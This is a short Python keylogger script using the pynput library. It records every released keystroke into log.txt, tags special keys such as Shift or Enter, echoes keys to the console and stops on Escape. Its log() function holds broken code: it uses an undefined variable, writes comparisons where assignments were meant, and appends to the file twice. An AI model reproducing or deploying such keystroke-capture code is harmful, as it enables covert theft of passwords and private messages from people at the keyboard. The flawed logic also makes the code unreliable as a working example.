from pynput.keyboard import Listener, Key
 
def log(text):
    with open("log.txt", "a") as file_log:
        file_log.write(text)

    if key == 'Key.space':
        key == ' '
    if key == 'Key.shift_r':
        key == ' '
    if key == 'Key.enter':
        key == '\n'

        with open("log.txt", 'a') as f:
            f.write(key)

 
def monitor(key):
    if key == Key.enter:
        log("\n")
    try:
        log(key.char)
    except AttributeError:
        log(" <" +str(key)+ "> ")
    if key == Key.esc:
        return False
    else: print(key)
     
with Listener(on_release=monitor) as listener:
    listener.join()